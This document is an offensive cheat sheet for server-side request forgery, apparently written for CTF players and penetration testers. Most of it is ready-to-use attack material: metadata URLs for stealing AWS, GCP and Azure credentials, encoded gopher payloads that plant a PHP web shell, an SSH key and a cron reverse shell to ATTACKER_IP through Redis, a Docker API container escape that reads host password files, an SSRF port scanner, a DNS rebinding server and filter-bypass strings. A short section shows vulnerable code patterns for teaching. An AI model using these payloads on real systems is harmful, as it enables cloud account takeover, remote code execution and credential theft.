# SSRF — Advanced Exploitation

---

## Quick Reference

| Target | Protocol | Key Payload |
|--------|----------|-------------|
| AWS IAM credentials | HTTP | `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE` |
| GCP access token | HTTP | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` |
| Azure OAuth token | HTTP | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` |
| Redis RCE | gopher | `gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall...` |
| Redis GET flag | gopher | `gopher://localhost:6379/_GET%20flag%0aquit` |
| Elasticsearch dump | HTTP | `http://localhost:9200/_search?q=flag` |
| Docker API | HTTP | `http://localhost:2375/containers/json` |
| Memcached dump | dict | `dict://localhost:11211/stats` |
| SMTP abuse | gopher | `gopher://localhost:25/_HELO...` |
| File read | file | `file:///proc/self/environ` |

```bash
# Fastest CTF cloud chain:
http://169.254.169.254/latest/meta-data/iam/security-credentials/   ← get role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME  ← get keys
http://169.254.169.254/latest/user-data/                             ← often has flags/secrets

# Fastest CTF internal service chain:
http://localhost:6379/        ← confirm Redis open
gopher://localhost:6379/_GET%20flag%0aquit  ← try direct flag key
dict://localhost:6379/GET:flag              ← dict alternative
```

---

## What are Advanced SSRF Attacks? 🔓

Basic SSRF confirms you can reach internal targets. Advanced SSRF chains that access into **actual exploitation** — stealing live cloud credentials, executing commands via protocol abuse, dumping internal databases, and pivoting through internal infrastructure.

**Impact:**
- 🔴 Cloud account takeover — steal IAM/OAuth tokens with full API access
- 🔴 RCE via Redis or Memcached — write web shells or SSH keys via gopher
- 🔴 Data exfiltration — dump Elasticsearch indices, MongoDB collections, Redis keys
- 🔴 Container escape — abuse Docker API to spawn privileged containers
- 🔴 Internal network pivot — use the compromised server as a jump host
- ⚠️ These attacks chain SSRF with unauthenticated internal services — real-world impact is severe

---

## AWS Metadata Deep Exploitation

### Step 1 — Enumerate Available Metadata

```
http://169.254.169.254/latest/meta-data/
```

Returns a directory listing of all available keys:

```
ami-id
ami-launch-index
hostname
instance-id
instance-type
local-hostname
local-ipv4
mac
network/
placement/
public-hostname
public-ipv4
public-keys/
security-groups
iam/
```

### Step 2 — Extract IAM Role Name

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Returns the IAM role name attached to the instance — e.g. `ec2-admin-role`.

### Step 3 — Steal Temporary Credentials

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin-role
```

Returns a JSON blob:

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI...",
  "Token": "IQoJb3JpZ2luX2...",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

**Use the stolen credentials:**

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2...

aws sts get-caller-identity    # confirm identity
aws s3 ls                      # list S3 buckets
aws secretsmanager list-secrets # list secrets
aws ec2 describe-instances     # map internal infrastructure
```

### Step 4 — Additional High-Value Endpoints

```
-- User data (startup scripts — often contains passwords, flags, API keys)
http://169.254.169.254/latest/user-data/

-- Full identity document (signed, contains account ID, region, instance ID)
http://169.254.169.254/latest/dynamic/instance-identity/document

-- Network interfaces (find internal IPs to pivot to)
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/network/interfaces/macs/MAC/vpc-id
http://169.254.169.254/latest/meta-data/network/interfaces/macs/MAC/subnet-id

-- SSH public keys (understand who has access)
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

### IMDSv2 Bypass

AWS IMDSv2 requires a PUT request to get a token first, then uses that token. Many SSRF vulnerabilities can still exploit IMDSv2 if the application forwards custom headers or supports PUT.

```
-- Step 1: Get token (requires PUT + TTL header)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

-- Step 2: Use token to read metadata
http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN_HERE
```

⚠️ If the SSRF vulnerability allows custom headers (e.g. via a server-side fetch where you control request headers), IMDSv2 is still exploitable. If headers cannot be set, IMDSv2 blocks you — fall back to other internal targets.

---

## GCP Metadata Deep Exploitation

### Access Token Theft

```
-- Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Returns:

```json
{
  "access_token": "ya29.c.b0AXv0zTM...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**Use the stolen token:**

```bash
# List GCS buckets
curl -H "Authorization: Bearer ya29.c.b0AXv0zTM..." \
  https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID

# List secrets in Secret Manager
curl -H "Authorization: Bearer ya29.c.b0AXv0zTM..." \
  https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets

# Get Compute Engine instances
curl -H "Authorization: Bearer ya29.c.b0AXv0zTM..." \
  https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/instances
```

### Full Metadata Dump

```
-- Recursive dump of all metadata (goldmine)
http://metadata.google.internal/computeMetadata/v1/?recursive=true
```

### Other Key GCP Endpoints

```
-- Project ID (needed for API calls)
http://metadata.google.internal/computeMetadata/v1/project/project-id

-- Service account email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

-- All service accounts attached
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

-- SSH keys
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

-- Custom instance attributes (may contain secrets)
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
```

---

## Azure Metadata Deep Exploitation

### Instance Metadata

```
-- Requires header: Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

Returns full JSON: subscription ID, resource group, VM name, location, tags.

### Managed Identity Token Theft

```
-- OAuth token for Azure Resource Manager
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

-- OAuth token for Key Vault
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net

-- OAuth token for Storage
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/
```

**Use the stolen token:**

```bash
# List resource groups
curl -H "Authorization: Bearer TOKEN" \
  https://management.azure.com/subscriptions/SUB_ID/resourceGroups?api-version=2021-04-01

# List Key Vault secrets
curl -H "Authorization: Bearer TOKEN" \
  https://VAULT_NAME.vault.azure.net/secrets?api-version=7.3
```

---

## Redis Exploitation via Gopher

Redis is the most commonly exploited internal service via SSRF. It has no authentication by default and supports multiple write primitives.

### Basic Recon

```
-- INFO via dict (simpler)
dict://localhost:6379/INFO
dict://localhost:6379/CONFIG:GET:dir

-- INFO via gopher
gopher://localhost:6379/_INFO%0aquit

-- Get a specific key
gopher://localhost:6379/_GET%20flag%0aquit
dict://localhost:6379/GET:flag
```

### Write Web Shell (Redis → PHP RCE)

Requires Redis to have write access to the web root:

```
gopher://localhost:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A%2Fvar%2Fwww%2Fhtml%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0Aquit%0D%0A
```

This payload does: `FLUSHALL` → `SET 1 "<?php system($_GET['cmd']); ?>"` → `CONFIG SET dir /var/www/html` → `CONFIG SET dbfilename shell.php` → `SAVE`.

### Write SSH Authorized Key (Redis → SSH access)

```
gopher://localhost:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%24400%0D%0A%0A%0Assh-rsa%20AAAAB3NzaC1yc2E...YOUR_PUBLIC_KEY...%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A%2Froot%2F.ssh%2F%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0Aquit%0D%0A
```

### Write Cron Job (Redis → RCE via cron)

```
gopher://localhost:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%0A%2A%2F1+%2A+%2A+%2A+%2A+bash+-i+%3E%26+%2Fdev%2Ftcp%2FATTACKER_IP%2F4444+0%3E%261%0A%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0Aquit%0D%0A
```

⚠️ Use **Gopherus** to generate clean gopher payloads automatically:

```bash
# Install
git clone https://github.com/tarunkant/Gopherus
cd Gopherus && pip install -r requirements.txt

# Generate Redis web shell payload
python2 gopherus.py --exploit redis

# Generate MySQL payload
python2 gopherus.py --exploit mysql

# Generate FastCGI payload
python2 gopherus.py --exploit fastcgi
```

---

## Elasticsearch Exploitation

Elasticsearch has no authentication by default and exposes a full REST API on port 9200.

### Recon

```
-- Cluster info
http://localhost:9200/

-- List all indices
http://localhost:9200/_cat/indices

-- Cluster health + node info
http://localhost:9200/_cluster/health
http://localhost:9200/_nodes

-- Search across all indices
http://localhost:9200/_all/_search
```

### Targeted Data Extraction

```
-- Search for passwords
http://localhost:9200/_search?q=password

-- Search for flags (CTF)
http://localhost:9200/_search?q=flag

-- Dump a specific index
http://localhost:9200/INDEX_NAME/_search

-- Get all documents in an index
http://localhost:9200/INDEX_NAME/_search?size=1000

-- Search for credentials in users index
http://localhost:9200/users/_search?q=*
```

---

## Docker API Exploitation

The Docker API on port 2375 (unauthenticated) gives full control over containers and the host.

### Recon

```
http://localhost:2375/version
http://localhost:2375/containers/json
http://localhost:2375/images/json
```

### Escape to Host via Privileged Container

Create a container that mounts the host filesystem:

```http
POST http://localhost:2375/containers/create
Content-Type: application/json

{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "cat /host/etc/passwd > /tmp/out && cat /host/flag.txt"],
  "Binds": ["/:/host"],
  "Privileged": true
}
```

Then start it and read the output:

```
POST http://localhost:2375/containers/CONTAINER_ID/start
GET  http://localhost:2375/containers/CONTAINER_ID/logs?stdout=1
```

### Read Host Files via Container Exec

```http
POST http://localhost:2375/containers/CONTAINER_ID/exec
{
  "Cmd": ["cat", "/host/etc/shadow"],
  "AttachStdout": true
}
```

### List Running Container Environment Variables

```
http://localhost:2375/containers/CONTAINER_ID/json
```

Look for `Env` array in the response — often contains `FLAG=`, `SECRET=`, `DB_PASSWORD=`.

---

## Memcached Exploitation

### Recon via dict

```
dict://localhost:11211/stats
dict://localhost:11211/version
```

### Dump All Keys and Values

```
-- Get slab info
gopher://localhost:11211/_stats%20items%0aquit

-- Dump keys in slab 1
gopher://localhost:11211/_stats%20cachedump%201%200%0aquit

-- Get a specific key
gopher://localhost:11211/_get%20SESSION_KEY%0aquit

-- Get flag key
gopher://localhost:11211/_get%20flag%0aquit
```

---

## Memcached and MySQL via Gopherus

For complex protocols (MySQL, PostgreSQL) that require binary handshakes, build payloads with Gopherus:

```bash
# MySQL — read /etc/passwd via LOAD DATA
python2 gopherus.py --exploit mysql
# Enter: username, query

# PostgreSQL
python2 gopherus.py --exploit postgresql

# FastCGI (PHP-FPM on port 9000)
python2 gopherus.py --exploit fastcgi
# Specify: /var/www/html/index.php, command to run
```

**FastCGI RCE (PHP-FPM port 9000):**

```
-- If PHP-FPM is running on port 9000
gopher://localhost:9000/GOPHERUS_GENERATED_PAYLOAD
```

---

## Blind SSRF Detection & Exploitation

When the server makes a request but never returns the response to you.

### Out-of-Band Detection

```
-- Burp Collaborator (generates unique subdomain)
http://YOUR-ID.burpcollaborator.net/

-- webhook.site
http://YOUR-UUID.webhook.site/

-- interactsh (self-hosted)
http://YOUR-ID.interact.sh/

-- requestbin
http://YOUR-ID.requestbin.com/
```

If your callback server receives a DNS lookup or HTTP request → blind SSRF confirmed ✅

### DNS Exfiltration

Exfiltrate data via DNS subdomains — each character or chunk becomes a subdomain:

```
http://STOLEN-DATA.your-burpcollaborator.net/
```

Works even when HTTP response is blocked — DNS lookups bypass many egress filters.

### Time-Based Port Detection

Use response time to infer open vs closed ports:

```python
import requests
import time

def ssrf_port_scan(ssrf_url, param, host, ports):
    open_ports = []
    for port in ports:
        target = f"http://{host}:{port}/"
        start = time.time()
        try:
            r = requests.get(ssrf_url, params={param: target}, timeout=4)
            elapsed = time.time() - start
            # Open port: fast response; closed port: timeout or instant reset
            if elapsed < 1.5:
                open_ports.append(port)
                print(f"[OPEN]   {port} ({elapsed:.2f}s) status={r.status_code}")
            else:
                print(f"[CLOSED] {port} ({elapsed:.2f}s)")
        except requests.exceptions.Timeout:
            print(f"[CLOSED] {port} (timeout)")
        except Exception as e:
            print(f"[ERROR]  {port} {e}")
    return open_ports

ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 9200, 11211, 27017, 2375]
ssrf_port_scan("http://target.com/fetch", "url", "127.0.0.1", ports)
```

### Error-Based Response Differences

Even without seeing the response body, different errors reveal internal state:

| Response | Meaning |
|----------|---------|
| Connection refused (fast) | Port closed |
| Timeout | Port filtered / host unreachable |
| 200 OK with body | Service open and responding |
| 200 OK empty body | Service open, no HTTP response |
| 500 Internal Server Error | Service found but unexpected protocol |
| Different Content-Length | Service returned different content |

---

## DNS Rebinding

DNS rebinding bypasses SSRF defenses that validate the URL at request time but cache the DNS result.

**How it works:**

```
1. Attacker registers evil.com with TTL=1 second
2. First DNS lookup: evil.com → 1.2.3.4 (legitimate IP — passes allowlist check)
3. Server validates: 1.2.3.4 is not internal → allowed ✅
4. 1 second passes — DNS TTL expires
5. Second DNS lookup (when server actually connects): evil.com → 127.0.0.1
6. Server connects to 127.0.0.1 — internal service reached 🔓
```

**Tools for DNS rebinding:**

```
-- rbndr.us (public service)
http://C0A80101.7f000001.rbndr.us/
-- Alternates between 192.168.1.1 and 127.0.0.1 on each query

-- singularity (self-hosted DNS rebinding server)
https://github.com/nccgroup/singularity

-- rebind.it (online tool)
```

**Custom DNS rebinding server (Python):**

```python
from dnslib.server import DNSServer, DNSRecord, BaseResolver, RR
from dnslib import A
import time

class RebindResolver(BaseResolver):
    def __init__(self):
        self.hit_count = {}

    def resolve(self, request, handler):
        domain = str(request.q.qname)
        count = self.hit_count.get(domain, 0)
        self.hit_count[domain] = count + 1

        reply = request.reply()
        if count == 0:
            reply.add_answer(RR(domain, rdata=A("1.2.3.4"), ttl=1))  # legit
        else:
            reply.add_answer(RR(domain, rdata=A("127.0.0.1"), ttl=1))  # internal
        return reply

resolver = RebindResolver()
server = DNSServer(resolver, port=53)
server.start_thread()
```

---

## Advanced Bypass Techniques

### SSRF via Open Redirect

If the target app has an open redirect, chain it:

```
-- App validates URL is "safe" then follows redirect to internal:
http://target.com/fetch?url=http://target.com/redirect?to=http://localhost/admin

-- External open redirect service:
http://target.com/fetch?url=https://open-redirect.site/r?url=http://169.254.169.254/
```

### SSRF via URL Scheme Confusion

```
-- Some parsers treat these as the same host:
http://localhost:80@169.254.169.254/
http://169.254.169.254 @localhost/     ← space before @

-- Backslash confusion:
http://localhost\@169.254.169.254/
```

### SSRF via Redirect Chain

```
-- 301 redirect to internal target bypasses URL validation at input time
-- Host a redirect on your server:
-- Location: http://169.254.169.254/latest/meta-data/

http://target.com/fetch?url=http://your-server.com/redirect-to-metadata
```

### SSRF via File Upload + Path

```
-- If upload endpoint fetches from URL and saves file:
url=file:///etc/passwd     → saves /etc/passwd content as uploaded file
url=file:///app/config.py  → leaks source code
```

### Combining IP Obfuscation + Path Traversal

```
http://127.0.0.1/../admin
http://2130706433/../../etc/passwd
http://localhost%2F..%2F..%2Fetc%2Fpasswd
```

---

## Exploitation Workflow

1. **Confirm SSRF and reach internal network** — out-of-band callback, then localhost probe
2. **Identify cloud provider** — test `169.254.169.254`; response format reveals AWS/GCP/Azure/DO
3. **Steal cloud credentials** — enumerate IAM role (AWS) or get token (GCP/Azure); use with cloud CLI
4. **Port scan internal services** — iterate common ports; use timing to distinguish open/closed
5. **Fingerprint services** — response content reveals Redis, Elasticsearch, Docker, Memcached
6. **Exploit Redis** — try GET flag via dict; escalate to web shell/SSH key write via gopher if needed
7. **Exploit Elasticsearch** — HTTP GET to `/_search?q=flag` or `/_all/_search`
8. **Exploit Docker API** — list containers for env vars; create privileged container to read host files
9. **Exploit Memcached** — stats → cachedump → get specific keys
10. **Escalate to RCE** — Redis cron/web shell, Docker privileged container, FastCGI via Gopherus
11. **Pivot** — use stolen credentials to enumerate wider cloud infrastructure

---

## Common Vulnerable Patterns

**Server-side fetch forwarding custom headers (IMDSv2 bypass):**

```python
# ❌ Vulnerable — forwards all request headers to the fetched URL
import requests

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    headers = dict(request.headers)   # attacker controls all headers
    r = requests.get(url, headers=headers)
    return r.content
# Attacker sends: X-aws-ec2-metadata-token-ttl-seconds: 21600
# → can perform IMDSv2 token request to metadata service
```

**Server follows redirects without re-validating:**

```python
# ❌ Vulnerable — validates URL before fetch but follows redirect to internal
import requests

def is_safe(url):
    # checks URL is not internal... but allows external
    return not url.startswith(('http://localhost', 'http://127'))

@app.route('/proxy')
def proxy():
    url = request.args.get('url')
    if not is_safe(url):
        return "Blocked", 403
    r = requests.get(url, allow_redirects=True)  # follows 301 to localhost
    return r.content
```

**DNS resolution at validation time, connection at different time:**

```python
# ❌ Vulnerable — DNS rebinding window between validation and connection
import socket, requests

def is_safe_host(url):
    host = urlparse(url).hostname
    ip = socket.gethostbyname(host)    # DNS lookup #1 → legit IP
    return not is_internal(ip)          # passes validation

def fetch(url):
    if is_safe_host(url):
        r = requests.get(url)          # DNS lookup #2 → may now resolve to 127.0.0.1
        return r.content
```

**Unrestricted protocol support:**

```python
# ❌ Vulnerable — supports file:// and gopher:// in addition to http://
import urllib.request

@app.route('/import')
def import_url():
    url = request.args.get('url')
    # urllib supports file://, gopher://, ftp:// — not just http://
    response = urllib.request.urlopen(url)
    return response.read()
```

---

## CTF & Practical Tips

**Fastest attack chain for CTFs:**

```
1. http://169.254.169.254/latest/user-data/           ← flag often here
2. http://169.254.169.254/latest/meta-data/iam/security-credentials/  ← get role
3. gopher://localhost:6379/_GET%20flag%0aquit          ← Redis flag
4. dict://localhost:6379/GET:flag                      ← Redis alt
5. http://localhost:9200/_search?q=flag                ← Elasticsearch
6. file:///flag.txt                                    ← direct file
7. http://localhost:2375/containers/json               ← Docker env vars
```

**Speed tips:**
- ✅ Try `dict://` before `gopher://` for Redis — simpler to type and works for reads
- ✅ `/_search?q=flag` on Elasticsearch often returns CTF flags in one request
- ✅ Always check container `Env` array in Docker API response — flags are frequently there
- ✅ For Gopherus payloads — always URL-encode the output before using in SSRF parameter
- ✅ Blind SSRF + DNS exfil: use `burpcollaborator.net` subdomains, check DNS tab not just HTTP
- ⚠️ GCP metadata always needs `Metadata-Flavor: Google` header — if you can't set headers, use `?recursive=true` via a proxy that adds it
- ⚠️ IMDSv2 blocks most SSRF unless the app forwards headers — check if the app passes through custom request headers before giving up on AWS

**Common CTF scenarios:**
- **"Running on AWS"** → metadata → IAM credentials → `aws s3 ls` for flag bucket
- **"Internal Redis"** → dict GET flag first; if not found, dump all keys via INFO
- **"Docker challenge"** → containers/json → inspect each container's Env for FLAG=
- **"Blind SSRF only"** → Burp Collaborator for confirmation, then time-based port scan
- **"Custom header supported"** → IMDSv2 bypass with `X-aws-ec2-metadata-token-ttl-seconds`

---

## Key Takeaways

- ✅ Cloud metadata at `169.254.169.254` is the highest-value target — AWS IAM keys give API-level access to the entire cloud account
- ✅ Redis via gopher is the most common path from SSRF to RCE — web shell, SSH key, and cron job writes all work without authentication
- ✅ Docker API on port 2375 gives full host access — privileged container with host mount = root on the host
- ✅ Blind SSRF is confirmed via DNS callback, exploited via timing — response content is not required
- ✅ DNS rebinding bypasses allowlist validation by exploiting the gap between DNS resolution at validation time and at connection time
- ✅ Gopherus automates gopher payload generation for Redis, MySQL, PostgreSQL, FastCGI — use it instead of hand-encoding